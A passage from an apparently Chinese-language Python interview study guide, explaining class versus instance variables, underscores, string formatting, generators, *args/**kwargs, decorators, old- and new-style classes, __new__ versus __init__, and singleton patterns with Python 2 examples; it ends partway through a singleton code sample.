\u200b\t\u662f\u53ef\u5728\u7c7b\u7684\u6240\u6709\u5b9e\u4f8b\u4e4b\u95f4\u5171\u4eab\u7684\u503c\uff08\u4e5f\u5c31\u662f\u8bf4\uff0c\u5b83\u4eec\u4e0d\u662f\u5355\u72ec\u5206\u914d\u7ed9\u6bcf\u4e2a\u5b9e\u4f8b\u7684\uff09\u3002\u4f8b\u5982\u4e0b\u4f8b\u4e2d\uff0cnum_of_instance \u5c31\u662f\u7c7b\u53d8\u91cf\uff0c\u7528\u4e8e\u8ddf\u8e2a\u5b58\u5728\u7740\u591a\u5c11\u4e2aTest \u7684\u5b9e\u4f8b\u3002\n\n**\u5b9e\u4f8b\u53d8\u91cf\uff1a**\n\n> \u5b9e\u4f8b\u5316\u4e4b\u540e\uff0c\u6bcf\u4e2a\u5b9e\u4f8b\u5355\u72ec\u62e5\u6709\u7684\u53d8\u91cf\u3002\n\n```python\nclass Test(object):  \n    num_of_instance = 0  \n    def __init__(self, name):  \n        self.name = name  \n        Test.num_of_instance += 1  \n  \nif __name__ == '__main__':  \n    print Test.num_of_instance   # 0\n    t1 = Test('jack')  \n    print Test.num_of_instance   # 1\n    t2 = Test('lucy')  \n    print t1.name , t1.num_of_instance  # jack 2\n    print t2.name , t2.num_of_instance  # lucy 2\n```\n\n> \u8865\u5145\u7684\u4f8b\u5b50\n\n```python\nclass Person:\n    name=\"aaa\"\n\np1=Person()\np2=Person()\np1.name=\"bbb\"\nprint p1.name  # bbb\nprint p2.name  # aaa\nprint Person.name  # aaa\n```\n\n\u8fd9\u91cc`p1.name=\"bbb\"`\u662f\u5b9e\u4f8b\u8c03\u7528\u4e86\u7c7b\u53d8\u91cf,\u8fd9\u5176\u5b9e\u548c\u4e0a\u9762\u7b2c\u4e00\u4e2a\u95ee\u9898\u4e00\u6837,\u5c31\u662f\u51fd\u6570\u4f20\u53c2\u7684\u95ee\u9898,`p1.name`\u4e00\u5f00\u59cb\u662f\u6307\u5411\u7684\u7c7b\u53d8\u91cf`name=\"aaa\"`,\u4f46\u662f\u5728\u5b9e\u4f8b\u7684\u4f5c\u7528\u57df\u91cc\u628a\u7c7b\u53d8\u91cf\u7684\u5f15\u7528\u6539\u53d8\u4e86,\u5c31\u53d8\u6210\u4e86\u4e00\u4e2a\u5b9e\u4f8b\u53d8\u91cf,self.name\u4e0d\u518d\u5f15\u7528Person\u7684\u7c7b\u53d8\u91cfname\u4e86.\n\n\u53ef\u4ee5\u770b\u770b\u4e0b\u9762\u7684\u4f8b\u5b50:\n\n```python\nclass Person:\n    name=[]\n\np1=Person()\np2=Person()\np1.name.append(1)\nprint p1.name  # [1]\nprint p2.name  # [1]\nprint Person.name  # [1]\n```\n\n\u53c2\u8003:http:\/\/stackoverflow.com\/questions\/6470428\/catch-multiple-exceptions-in-one-line-except-block\n\n## 5 Python\u81ea\u7701\n\n\u8fd9\u4e2a\u4e5f\u662fpython\u5f6a\u608d\u7684\u7279\u6027.\n\n\u81ea\u7701\u5c31\u662f\u9762\u5411\u5bf9\u8c61\u7684\u8bed\u8a00\u6240\u5199\u7684\u7a0b\u5e8f\u5728\u8fd0\u884c\u65f6,\u6240\u80fd\u77e5\u9053\u5bf9\u8c61\u7684\u7c7b\u578b.\u7b80\u5355\u4e00\u53e5\u5c31\u662f\u8fd0\u884c\u65f6\u80fd\u591f\u83b7\u5f97\u5bf9\u8c61\u7684\u7c7b\u578b.\u6bd4\u5982type(),dir(),getattr(),hasattr(),isinstance().\n\n```python\na = [1,2,3]\nb = {'a':1,'b':2,'c':3}\nc = True\nprint type(a),type(b),type(c) # <type 'list'> <type 'dict'> <type 'bool'>\nprint isinstance(a,list)  # True\n```\n\n\n\n## 6 \u5b57\u5178\u63a8\u5bfc\u5f0f\n\n\u53ef\u80fd\u4f60\u89c1\u8fc7\u5217\u8868\u63a8\u5bfc\u65f6,\u5374\u6ca1\u6709\u89c1\u8fc7\u5b57\u5178\u63a8\u5bfc\u5f0f,\u57282.7\u4e2d\u624d\u52a0\u5165\u7684:\n\n```python\nd = {key: value for (key, value) in iterable}\n```\n\n## 7 Python\u4e2d\u5355\u4e0b\u5212\u7ebf\u548c\u53cc\u4e0b\u5212\u7ebf\n\n```python\n>>> class MyClass():\n...     def __init__(self):\n...             self.__superprivate = \"Hello\"\n...             self._semiprivate = \", world!\"\n...\n>>> mc = MyClass()\n>>> print mc.__superprivate\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nAttributeError: myClass instance has no attribute '__superprivate'\n>>> print mc._semiprivate\n, world!\n>>> print mc.__dict__\n{'_MyClass__superprivate': 'Hello', '_semiprivate': ', world!'}\n```\n\n`__foo__`:\u4e00\u79cd\u7ea6\u5b9a,Python\u5185\u90e8\u7684\u540d\u5b57,\u7528\u6765\u533a\u522b\u5176\u4ed6\u7528\u6237\u81ea\u5b9a\u4e49\u7684\u547d\u540d,\u4ee5\u9632\u51b2\u7a81\uff0c\u5c31\u662f\u4f8b\u5982`__init__()`,`__del__()`,`__call__()`\u8fd9\u4e9b\u7279\u6b8a\u65b9\u6cd5\n\n`_foo`:\u4e00\u79cd\u7ea6\u5b9a,\u7528\u6765\u6307\u5b9a\u53d8\u91cf\u79c1\u6709.\u7a0b\u5e8f\u5458\u7528\u6765\u6307\u5b9a\u79c1\u6709\u53d8\u91cf\u7684\u4e00\u79cd\u65b9\u5f0f.\u4e0d\u80fd\u7528from module import * \u5bfc\u5165\uff0c\u5176\u4ed6\u65b9\u9762\u548c\u516c\u6709\u4e00\u6837\u8bbf\u95ee\uff1b\n\n`__foo`:\u8fd9\u4e2a\u6709\u771f\u6b63\u7684\u610f\u4e49:\u89e3\u6790\u5668\u7528`_classname__foo`\u6765\u4ee3\u66ff\u8fd9\u4e2a\u540d\u5b57,\u4ee5\u533a\u522b\u548c\u5176\u4ed6\u7c7b\u76f8\u540c\u7684\u547d\u540d,\u5b83\u65e0\u6cd5\u76f4\u63a5\u50cf\u516c\u6709\u6210\u5458\u4e00\u6837\u968f\u4fbf\u8bbf\u95ee,\u901a\u8fc7\u5bf9\u8c61\u540d._\u7c7b\u540d__xxx\u8fd9\u6837\u7684\u65b9\u5f0f\u53ef\u4ee5\u8bbf\u95ee.\n\n\u8be6\u60c5\u89c1:http:\/\/stackoverflow.com\/questions\/1301346\/the-meaning-of-a-single-and-a-double-underscore-before-an-object-name-in-python\n\n\u6216\u8005: http:\/\/www.zhihu.com\/question\/19754941\n\n## 8 \u5b57\u7b26\u4e32\u683c\u5f0f\u5316:%\u548c.format\n\n.format\u5728\u8bb8\u591a\u65b9\u9762\u770b\u8d77\u6765\u66f4\u4fbf\u5229.\u5bf9\u4e8e`%`\u6700\u70e6\u4eba\u7684\u662f\u5b83\u65e0\u6cd5\u540c\u65f6\u4f20\u9012\u4e00\u4e2a\u53d8\u91cf\u548c\u5143\u7ec4.\u4f60\u53ef\u80fd\u4f1a\u60f3\u4e0b\u9762\u7684\u4ee3\u7801\u4e0d\u4f1a\u6709\u4ec0\u4e48\u95ee\u9898:\n\n```\n\"hi there %s\" % name\n```\n\n\u4f46\u662f,\u5982\u679cname\u6070\u597d\u662f(1,2,3),\u5b83\u5c06\u4f1a\u629b\u51fa\u4e00\u4e2aTypeError\u5f02\u5e38.\u4e3a\u4e86\u4fdd\u8bc1\u5b83\u603b\u662f\u6b63\u786e\u7684,\u4f60\u5fc5\u987b\u8fd9\u6837\u505a:\n\n```\n\"hi there %s\" % (name,)   # \u63d0\u4f9b\u4e00\u4e2a\u5355\u5143\u7d20\u7684\u6570\u7ec4\u800c\u4e0d\u662f\u4e00\u4e2a\u53c2\u6570\n```\n\n\u4f46\u662f\u6709\u70b9\u4e11..format\u5c31\u6ca1\u6709\u8fd9\u4e9b\u95ee\u9898.\u4f60\u7ed9\u7684\u7b2c\u4e8c\u4e2a\u95ee\u9898\u4e5f\u662f\u8fd9\u6837,.format\u597d\u770b\u591a\u4e86.\n\n\u4f60\u4e3a\u4ec0\u4e48\u4e0d\u7528\u5b83?\n\n* \u4e0d\u77e5\u9053\u5b83(\u5728\u8bfb\u8fd9\u4e2a\u4e4b\u524d)\n* \u4e3a\u4e86\u548cPython2.5\u517c\u5bb9(\u8b6c\u5982logging\u5e93\u5efa\u8bae\u4f7f\u7528`%`([issue #4](https:\/\/github.com\/taizilongxu\/interview_python\/issues\/4)))\n\nhttp:\/\/stackoverflow.com\/questions\/5082452\/python-string-formatting-vs-format\n\n## 9 \u8fed\u4ee3\u5668\u548c\u751f\u6210\u5668\n\n\u8fd9\u4e2a\u662fstackoverflow\u91ccpython\u6392\u540d\u7b2c\u4e00\u7684\u95ee\u9898,\u503c\u5f97\u4e00\u770b: http:\/\/stackoverflow.com\/questions\/231767\/what-does-the-yield-keyword-do-in-python\n\n\u8fd9\u662f\u4e2d\u6587\u7248: http:\/\/taizilongxu.gitbooks.io\/stackoverflow-about-python\/content\/1\/README.html\n\n\u8fd9\u91cc\u6709\u4e2a\u5173\u4e8e\u751f\u6210\u5668\u7684\u521b\u5efa\u95ee\u9898\u9762\u8bd5\u5b98\u6709\u8003\uff1a\n\u95ee\uff1a  \u5c06\u5217\u8868\u751f\u6210\u5f0f\u4e2d[]\u6539\u6210() \u4e4b\u540e\u6570\u636e\u7ed3\u6784\u662f\u5426\u6539\u53d8\uff1f \n\u7b54\u6848\uff1a\u662f\uff0c\u4ece\u5217\u8868\u53d8\u4e3a\u751f\u6210\u5668\n\n```python\n>>> L = [x*x for x in range(10)]\n>>> L\n[0, 1, 4, 9, 16, 25, 36, 49, 64, 81]\n>>> g = (x*x for x in range(10))\n>>> g\n<generator object <genexpr> at 0x0000028F8B774200>\n```\n\u901a\u8fc7\u5217\u8868\u751f\u6210\u5f0f\uff0c\u53ef\u4ee5\u76f4\u63a5\u521b\u5efa\u4e00\u4e2a\u5217\u8868\u3002\u4f46\u662f\uff0c\u53d7\u5230\u5185\u5b58\u9650\u5236\uff0c\u5217\u8868\u5bb9\u91cf\u80af\u5b9a\u662f\u6709\u9650\u7684\u3002\u800c\u4e14\uff0c\u521b\u5efa\u4e00\u4e2a\u5305\u542b\u767e\u4e07\u5143\u7d20\u7684\u5217\u8868\uff0c\u4e0d\u4ec5\u662f\u5360\u7528\u5f88\u5927\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u5982\uff1a\u6211\u4eec\u53ea\u9700\u8981\u8bbf\u95ee\u524d\u9762\u7684\u51e0\u4e2a\u5143\u7d20\uff0c\u540e\u9762\u5927\u90e8\u5206\u5143\u7d20\u6240\u5360\u7684\u7a7a\u95f4\u90fd\u662f\u6d6a\u8d39\u7684\u3002\u56e0\u6b64\uff0c\u6ca1\u6709\u5fc5\u8981\u521b\u5efa\u5b8c\u6574\u7684\u5217\u8868\uff08\u8282\u7701\u5927\u91cf\u5185\u5b58\u7a7a\u95f4\uff09\u3002\u5728Python\u4e2d\uff0c\u6211\u4eec\u53ef\u4ee5\u91c7\u7528\u751f\u6210\u5668\uff1a\u8fb9\u5faa\u73af\uff0c\u8fb9\u8ba1\u7b97\u7684\u673a\u5236\u2014>generator\n\n## 10 `*args` and `**kwargs`\n\n\u7528`*args`\u548c`**kwargs`\u53ea\u662f\u4e3a\u4e86\u65b9\u4fbf\u5e76\u6ca1\u6709\u5f3a\u5236\u4f7f\u7528\u5b83\u4eec.\n\n\u5f53\u4f60\u4e0d\u786e\u5b9a\u4f60\u7684\u51fd\u6570\u91cc\u5c06\u8981\u4f20\u9012\u591a\u5c11\u53c2\u6570\u65f6\u4f60\u53ef\u4ee5\u7528`*args`.\u4f8b\u5982,\u5b83\u53ef\u4ee5\u4f20\u9012\u4efb\u610f\u6570\u91cf\u7684\u53c2\u6570:\n\n```python\n>>> def print_everything(*args):\n        for count, thing in enumerate(args):\n...         print '{0}. {1}'.format(count, thing)\n...\n>>> print_everything('apple', 'banana', 'cabbage')\n0. apple\n1. banana\n2. cabbage\n```\n\n\u76f8\u4f3c\u7684,`**kwargs`\u5141\u8bb8\u4f60\u4f7f\u7528\u6ca1\u6709\u4e8b\u5148\u5b9a\u4e49\u7684\u53c2\u6570\u540d:\n\n```python\n>>> def table_things(**kwargs):\n...     for name, value in kwargs.items():\n...         print '{0} = {1}'.format(name, value)\n...\n>>> table_things(apple = 'fruit', cabbage = 'vegetable')\ncabbage = vegetable\napple = fruit\n```\n\n\u4f60\u4e5f\u53ef\u4ee5\u6df7\u7740\u7528.\u547d\u540d\u53c2\u6570\u9996\u5148\u83b7\u5f97\u53c2\u6570\u503c\u7136\u540e\u6240\u6709\u7684\u5176\u4ed6\u53c2\u6570\u90fd\u4f20\u9012\u7ed9`*args`\u548c`**kwargs`.\u547d\u540d\u53c2\u6570\u5728\u5217\u8868\u7684\u6700\u524d\u7aef.\u4f8b\u5982:\n\n```\ndef table_things(titlestring, **kwargs)\n```\n\n`*args`\u548c`**kwargs`\u53ef\u4ee5\u540c\u65f6\u5728\u51fd\u6570\u7684\u5b9a\u4e49\u4e2d,\u4f46\u662f`*args`\u5fc5\u987b\u5728`**kwargs`\u524d\u9762.\n\n\u5f53\u8c03\u7528\u51fd\u6570\u65f6\u4f60\u4e5f\u53ef\u4ee5\u7528`*`\u548c`**`\u8bed\u6cd5.\u4f8b\u5982:\n\n```python\n>>> def print_three_things(a, b, c):\n...     print 'a = {0}, b = {1}, c = {2}'.format(a,b,c)\n...\n>>> mylist = ['aardvark', 'baboon', 'cat']\n>>> print_three_things(*mylist)\n\na = aardvark, b = baboon, c = cat\n```\n\n\u5c31\u50cf\u4f60\u770b\u5230\u7684\u4e00\u6837,\u5b83\u53ef\u4ee5\u4f20\u9012\u5217\u8868(\u6216\u8005\u5143\u7ec4)\u7684\u6bcf\u4e00\u9879\u5e76\u628a\u5b83\u4eec\u89e3\u5305.\u6ce8\u610f\u5fc5\u987b\u4e0e\u5b83\u4eec\u5728\u51fd\u6570\u91cc\u7684\u53c2\u6570\u76f8\u543b\u5408.\u5f53\u7136,\u4f60\u4e5f\u53ef\u4ee5\u5728\u51fd\u6570\u5b9a\u4e49\u6216\u8005\u51fd\u6570\u8c03\u7528\u65f6\u7528*.\n\nhttp:\/\/stackoverflow.com\/questions\/3394835\/args-and-kwargs\n\n## 11 \u9762\u5411\u5207\u9762\u7f16\u7a0bAOP\u548c\u88c5\u9970\u5668\n\n\u8fd9\u4e2aAOP\u4e00\u542c\u8d77\u6765\u6709\u70b9\u61f5,\u540c\u5b66\u9762\u963f\u91cc\u7684\u65f6\u5019\u5c31\u88ab\u95ee\u61f5\u4e86...\n\n\u88c5\u9970\u5668\u662f\u4e00\u4e2a\u5f88\u8457\u540d\u7684\u8bbe\u8ba1\u6a21\u5f0f\uff0c\u7ecf\u5e38\u88ab\u7528\u4e8e\u6709\u5207\u9762\u9700\u6c42\u7684\u573a\u666f\uff0c\u8f83\u4e3a\u7ecf\u5178\u7684\u6709\u63d2\u5165\u65e5\u5fd7\u3001\u6027\u80fd\u6d4b\u8bd5\u3001\u4e8b\u52a1\u5904\u7406\u7b49\u3002\u88c5\u9970\u5668\u662f\u89e3\u51b3\u8fd9\u7c7b\u95ee\u9898\u7684\u7edd\u4f73\u8bbe\u8ba1\uff0c\u6709\u4e86\u88c5\u9970\u5668\uff0c\u6211\u4eec\u5c31\u53ef\u4ee5\u62bd\u79bb\u51fa\u5927\u91cf\u51fd\u6570\u4e2d\u4e0e\u51fd\u6570\u529f\u80fd\u672c\u8eab\u65e0\u5173\u7684\u96f7\u540c\u4ee3\u7801\u5e76\u7ee7\u7eed\u91cd\u7528\u3002\u6982\u62ec\u7684\u8bb2\uff0c**\u88c5\u9970\u5668\u7684\u4f5c\u7528\u5c31\u662f\u4e3a\u5df2\u7ecf\u5b58\u5728\u7684\u5bf9\u8c61\u6dfb\u52a0\u989d\u5916\u7684\u529f\u80fd\u3002**\n\n\u8fd9\u4e2a\u95ee\u9898\u6bd4\u8f83\u5927,\u63a8\u8350: http:\/\/stackoverflow.com\/questions\/739654\/how-can-i-make-a-chain-of-function-decorators-in-python\n\n\u4e2d\u6587: http:\/\/taizilongxu.gitbooks.io\/stackoverflow-about-python\/content\/3\/README.html\n\n## 12 \u9e2d\u5b50\u7c7b\u578b\n\n\u201c\u5f53\u770b\u5230\u4e00\u53ea\u9e1f\u8d70\u8d77\u6765\u50cf\u9e2d\u5b50\u3001\u6e38\u6cf3\u8d77\u6765\u50cf\u9e2d\u5b50\u3001\u53eb\u8d77\u6765\u4e5f\u50cf\u9e2d\u5b50\uff0c\u90a3\u4e48\u8fd9\u53ea\u9e1f\u5c31\u53ef\u4ee5\u88ab\u79f0\u4e3a\u9e2d\u5b50\u3002\u201d\n\n\u6211\u4eec\u5e76\u4e0d\u5173\u5fc3\u5bf9\u8c61\u662f\u4ec0\u4e48\u7c7b\u578b\uff0c\u5230\u5e95\u662f\u4e0d\u662f\u9e2d\u5b50\uff0c\u53ea\u5173\u5fc3\u884c\u4e3a\u3002\n\n\u6bd4\u5982\u5728python\u4e2d\uff0c\u6709\u5f88\u591afile-like\u7684\u4e1c\u897f\uff0c\u6bd4\u5982StringIO,GzipFile,socket\u3002\u5b83\u4eec\u6709\u5f88\u591a\u76f8\u540c\u7684\u65b9\u6cd5\uff0c\u6211\u4eec\u628a\u5b83\u4eec\u5f53\u4f5c\u6587\u4ef6\u4f7f\u7528\u3002\n\n\u53c8\u6bd4\u5982list.extend()\u65b9\u6cd5\u4e2d,\u6211\u4eec\u5e76\u4e0d\u5173\u5fc3\u5b83\u7684\u53c2\u6570\u662f\u4e0d\u662flist,\u53ea\u8981\u5b83\u662f\u53ef\u8fed\u4ee3\u7684,\u6240\u4ee5\u5b83\u7684\u53c2\u6570\u53ef\u4ee5\u662flist\/tuple\/dict\/\u5b57\u7b26\u4e32\/\u751f\u6210\u5668\u7b49.\n\n\u9e2d\u5b50\u7c7b\u578b\u5728\u52a8\u6001\u8bed\u8a00\u4e2d\u7ecf\u5e38\u4f7f\u7528\uff0c\u975e\u5e38\u7075\u6d3b\uff0c\u4f7f\u5f97python\u4e0d\u60f3java\u90a3\u6837\u4e13\u95e8\u53bb\u5f04\u4e00\u5927\u5806\u7684\u8bbe\u8ba1\u6a21\u5f0f\u3002\n\n## 13 Python\u4e2d\u91cd\u8f7d\n\n\u5f15\u81ea\u77e5\u4e4e:http:\/\/www.zhihu.com\/question\/20053359\n\n\u51fd\u6570\u91cd\u8f7d\u4e3b\u8981\u662f\u4e3a\u4e86\u89e3\u51b3\u4e24\u4e2a\u95ee\u9898\u3002\n\n1. \u53ef\u53d8\u53c2\u6570\u7c7b\u578b\u3002\n2. \u53ef\u53d8\u53c2\u6570\u4e2a\u6570\u3002\n\n\u53e6\u5916\uff0c\u4e00\u4e2a\u57fa\u672c\u7684\u8bbe\u8ba1\u539f\u5219\u662f\uff0c\u4ec5\u4ec5\u5f53\u4e24\u4e2a\u51fd\u6570\u9664\u4e86\u53c2\u6570\u7c7b\u578b\u548c\u53c2\u6570\u4e2a\u6570\u4e0d\u540c\u4ee5\u5916\uff0c\u5176\u529f\u80fd\u662f\u5b8c\u5168\u76f8\u540c\u7684\uff0c\u6b64\u65f6\u624d\u4f7f\u7528\u51fd\u6570\u91cd\u8f7d\uff0c\u5982\u679c\u4e24\u4e2a\u51fd\u6570\u7684\u529f\u80fd\u5176\u5b9e\u4e0d\u540c\uff0c\u90a3\u4e48\u4e0d\u5e94\u5f53\u4f7f\u7528\u91cd\u8f7d\uff0c\u800c\u5e94\u5f53\u4f7f\u7528\u4e00\u4e2a\u540d\u5b57\u4e0d\u540c\u7684\u51fd\u6570\u3002\n\n\u597d\u5427\uff0c\u90a3\u4e48\u5bf9\u4e8e\u60c5\u51b5 1 \uff0c\u51fd\u6570\u529f\u80fd\u76f8\u540c\uff0c\u4f46\u662f\u53c2\u6570\u7c7b\u578b\u4e0d\u540c\uff0cpython \u5982\u4f55\u5904\u7406\uff1f\u7b54\u6848\u662f\u6839\u672c\u4e0d\u9700\u8981\u5904\u7406\uff0c\u56e0\u4e3a python \u53ef\u4ee5\u63a5\u53d7\u4efb\u4f55\u7c7b\u578b\u7684\u53c2\u6570\uff0c\u5982\u679c\u51fd\u6570\u7684\u529f\u80fd\u76f8\u540c\uff0c\u90a3\u4e48\u4e0d\u540c\u7684\u53c2\u6570\u7c7b\u578b\u5728 python \u4e2d\u5f88\u53ef\u80fd\u662f\u76f8\u540c\u7684\u4ee3\u7801\uff0c\u6ca1\u6709\u5fc5\u8981\u505a\u6210\u4e24\u4e2a\u4e0d\u540c\u51fd\u6570\u3002\n\n\u90a3\u4e48\u5bf9\u4e8e\u60c5\u51b5 2 \uff0c\u51fd\u6570\u529f\u80fd\u76f8\u540c\uff0c\u4f46\u53c2\u6570\u4e2a\u6570\u4e0d\u540c\uff0cpython \u5982\u4f55\u5904\u7406\uff1f\u5927\u5bb6\u77e5\u9053\uff0c\u7b54\u6848\u5c31\u662f\u7f3a\u7701\u53c2\u6570\u3002\u5bf9\u90a3\u4e9b\u7f3a\u5c11\u7684\u53c2\u6570\u8bbe\u5b9a\u4e3a\u7f3a\u7701\u53c2\u6570\u5373\u53ef\u89e3\u51b3\u95ee\u9898\u3002\u56e0\u4e3a\u4f60\u5047\u8bbe\u51fd\u6570\u529f\u80fd\u76f8\u540c\uff0c\u90a3\u4e48\u90a3\u4e9b\u7f3a\u5c11\u7684\u53c2\u6570\u7ec8\u5f52\u662f\u9700\u8981\u7528\u7684\u3002\n\n\u597d\u4e86\uff0c\u9274\u4e8e\u60c5\u51b5 1 \u8ddf \u60c5\u51b5 2 \u90fd\u6709\u4e86\u89e3\u51b3\u65b9\u6848\uff0cpython \u81ea\u7136\u5c31\u4e0d\u9700\u8981\u51fd\u6570\u91cd\u8f7d\u4e86\u3002\n\n## 14 \u65b0\u5f0f\u7c7b\u548c\u65e7\u5f0f\u7c7b\n\n\u8fd9\u4e2a\u9762\u8bd5\u5b98\u95ee\u4e86,\u6211\u8bf4\u4e86\u8001\u534a\u5929,\u4e0d\u77e5\u9053\u4ed6\u95ee\u7684\u771f\u6b63\u610f\u56fe\u662f\u4ec0\u4e48.\n\n[stackoverflow](http:\/\/stackoverflow.com\/questions\/54867\/what-is-the-difference-between-old-style-and-new-style-classes-in-python)\n\n\u8fd9\u7bc7\u6587\u7ae0\u5f88\u597d\u7684\u4ecb\u7ecd\u4e86\u65b0\u5f0f\u7c7b\u7684\u7279\u6027: http:\/\/www.cnblogs.com\/btchenguang\/archive\/2012\/09\/17\/2689146.html\n\n\u65b0\u5f0f\u7c7b\u5f88\u65e9\u57282.2\u5c31\u51fa\u73b0\u4e86,\u6240\u4ee5\u65e7\u5f0f\u7c7b\u5b8c\u5168\u662f\u517c\u5bb9\u7684\u95ee\u9898,Python3\u91cc\u7684\u7c7b\u5168\u90e8\u90fd\u662f\u65b0\u5f0f\u7c7b.\u8fd9\u91cc\u6709\u4e00\u4e2aMRO\u95ee\u9898\u53ef\u4ee5\u4e86\u89e3\u4e0b(\u65b0\u5f0f\u7c7b\u7ee7\u627f\u662f\u6839\u636eC3\u7b97\u6cd5,\u65e7\u5f0f\u7c7b\u662f\u6df1\u5ea6\u4f18\u5148),<Python\u6838\u5fc3\u7f16\u7a0b>\u91cc\u8bb2\u7684\u4e5f\u5f88\u591a.\n\n> \u4e00\u4e2a\u65e7\u5f0f\u7c7b\u7684\u6df1\u5ea6\u4f18\u5148\u7684\u4f8b\u5b50\n\n```python\nclass A():\n    def foo1(self):\n        print \"A\"\nclass B(A):\n    def foo2(self):\n        pass\nclass C(A):\n    def foo1(self):\n        print \"C\"\nclass D(B, C):\n    pass\n\nd = D()\nd.foo1()\n\n# A\n```\n\n**\u6309\u7167\u7ecf\u5178\u7c7b\u7684\u67e5\u627e\u987a\u5e8f`\u4ece\u5de6\u5230\u53f3\u6df1\u5ea6\u4f18\u5148`\u7684\u89c4\u5219\uff0c\u5728\u8bbf\u95ee`d.foo1()`\u7684\u65f6\u5019,D\u8fd9\u4e2a\u7c7b\u662f\u6ca1\u6709\u7684..\u90a3\u4e48\u5f80\u4e0a\u67e5\u627e,\u5148\u627e\u5230B,\u91cc\u9762\u6ca1\u6709,\u6df1\u5ea6\u4f18\u5148,\u8bbf\u95eeA,\u627e\u5230\u4e86foo1(),\u6240\u4ee5\u8fd9\u65f6\u5019\u8c03\u7528\u7684\u662fA\u7684foo1()\uff0c\u4ece\u800c\u5bfc\u81f4C\u91cd\u5199\u7684foo1()\u88ab\u7ed5\u8fc7**\n\n\n\n## 15 `__new__`\u548c`__init__`\u7684\u533a\u522b\n\n\u8fd9\u4e2a`__new__`\u786e\u5b9e\u5f88\u5c11\u89c1\u5230,\u5148\u505a\u4e86\u89e3\u5427.\n\n1. `__new__`\u662f\u4e00\u4e2a\u9759\u6001\u65b9\u6cd5,\u800c`__init__`\u662f\u4e00\u4e2a\u5b9e\u4f8b\u65b9\u6cd5.\n2. `__new__`\u65b9\u6cd5\u4f1a\u8fd4\u56de\u4e00\u4e2a\u521b\u5efa\u7684\u5b9e\u4f8b,\u800c`__init__`\u4ec0\u4e48\u90fd\u4e0d\u8fd4\u56de.\n3. \u53ea\u6709\u5728`__new__`\u8fd4\u56de\u4e00\u4e2acls\u7684\u5b9e\u4f8b\u65f6\u540e\u9762\u7684`__init__`\u624d\u80fd\u88ab\u8c03\u7528.\n4. \u5f53\u521b\u5efa\u4e00\u4e2a\u65b0\u5b9e\u4f8b\u65f6\u8c03\u7528`__new__`,\u521d\u59cb\u5316\u4e00\u4e2a\u5b9e\u4f8b\u65f6\u7528`__init__`.\n\n[stackoverflow](http:\/\/stackoverflow.com\/questions\/674304\/pythons-use-of-new-and-init)\n\nps: `__metaclass__`\u662f\u521b\u5efa\u7c7b\u65f6\u8d77\u4f5c\u7528.\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5206\u522b\u4f7f\u7528`__metaclass__`,`__new__`\u548c`__init__`\u6765\u5206\u522b\u5728\u7c7b\u521b\u5efa,\u5b9e\u4f8b\u521b\u5efa\u548c\u5b9e\u4f8b\u521d\u59cb\u5316\u7684\u65f6\u5019\u505a\u4e00\u4e9b\u5c0f\u624b\u811a.\n\n## 16 \u5355\u4f8b\u6a21\u5f0f\n\n> \u200b\t\u5355\u4f8b\u6a21\u5f0f\u662f\u4e00\u79cd\u5e38\u7528\u7684\u8f6f\u4ef6\u8bbe\u8ba1\u6a21\u5f0f\u3002\u5728\u5b83\u7684\u6838\u5fc3\u7ed3\u6784\u4e2d\u53ea\u5305\u542b\u4e00\u4e2a\u88ab\u79f0\u4e3a\u5355\u4f8b\u7c7b\u7684\u7279\u6b8a\u7c7b\u3002\u901a\u8fc7\u5355\u4f8b\u6a21\u5f0f\u53ef\u4ee5\u4fdd\u8bc1\u7cfb\u7edf\u4e2d\u4e00\u4e2a\u7c7b\u53ea\u6709\u4e00\u4e2a\u5b9e\u4f8b\u800c\u4e14\u8be5\u5b9e\u4f8b\u6613\u4e8e\u5916\u754c\u8bbf\u95ee\uff0c\u4ece\u800c\u65b9\u4fbf\u5bf9\u5b9e\u4f8b\u4e2a\u6570\u7684\u63a7\u5236\u5e76\u8282\u7ea6\u7cfb\u7edf\u8d44\u6e90\u3002\u5982\u679c\u5e0c\u671b\u5728\u7cfb\u7edf\u4e2d\u67d0\u4e2a\u7c7b\u7684\u5bf9\u8c61\u53ea\u80fd\u5b58\u5728\u4e00\u4e2a\uff0c\u5355\u4f8b\u6a21\u5f0f\u662f\u6700\u597d\u7684\u89e3\u51b3\u65b9\u6848\u3002\n>\n> `__new__()`\u5728`__init__()`\u4e4b\u524d\u88ab\u8c03\u7528\uff0c\u7528\u4e8e\u751f\u6210\u5b9e\u4f8b\u5bf9\u8c61\u3002\u5229\u7528\u8fd9\u4e2a\u65b9\u6cd5\u548c\u7c7b\u7684\u5c5e\u6027\u7684\u7279\u70b9\u53ef\u4ee5\u5b9e\u73b0\u8bbe\u8ba1\u6a21\u5f0f\u7684\u5355\u4f8b\u6a21\u5f0f\u3002\u5355\u4f8b\u6a21\u5f0f\u662f\u6307\u521b\u5efa\u552f\u4e00\u5bf9\u8c61\uff0c\u5355\u4f8b\u6a21\u5f0f\u8bbe\u8ba1\u7684\u7c7b\u53ea\u80fd\u5b9e\u4f8b\n**\u8fd9\u4e2a\u7edd\u5bf9\u5e38\u8003\u554a.\u7edd\u5bf9\u8981\u8bb0\u4f4f1~2\u4e2a\u65b9\u6cd5,\u5f53\u65f6\u9762\u8bd5\u5b98\u662f\u8ba9\u624b\u5199\u7684.**\n\n### 1 \u4f7f\u7528`__new__`\u65b9\u6cd5\n\n```python\nclass Singleton(object):\n    def __new__(cls, *args, **kw):\n        if not hasattr(cls, '_instance'):\n            orig = super(Singleton, cls)\n            cls._instance = orig.__new__(cls, *args, **kw)\n        return cls._instance\n\nclass MyClass(Singleton):\n    a = 1\n```\n\n### 2 \u5171\u4eab\u5c5e\u6027\n\n\u521b\u5efa\u5b9e\u4f8b\u65f6\u628a\u6240\u6709\u5b9e\u4f8b\u7684`__dict__`\u6307\u5411\u540c\u4e00\u4e2a\u5b57\u5178,\u8fd9\u6837\u5b83\u4eec\u5177\u6709\u76f8\u540c\u7684\u5c5e\u6027\u548c\u65b9\u6cd5.\n\n```python\n\nclass Borg(object):\n    _state = {}\n    def __new__(cls, *args, **kw):\n        ob = super(Borg, cls).__new__(cls, *args, **kw)\n        ob.__dict__ = cls._state\n        return ob\n\nclass MyClass2(Borg):\n    a = 1\n```\n\n### 3 \u88c5\u9970\u5668\u7248\u672c\n\n```python\ndef singleton(cls):\n    instances = {}\n    def getinstance(*args, **kw):\n        if cls not in instances:\n            instances[cls] = cls(*args, **kw)\n        return instances[cls]\n    return getinstance\n\n@singleton\nclass 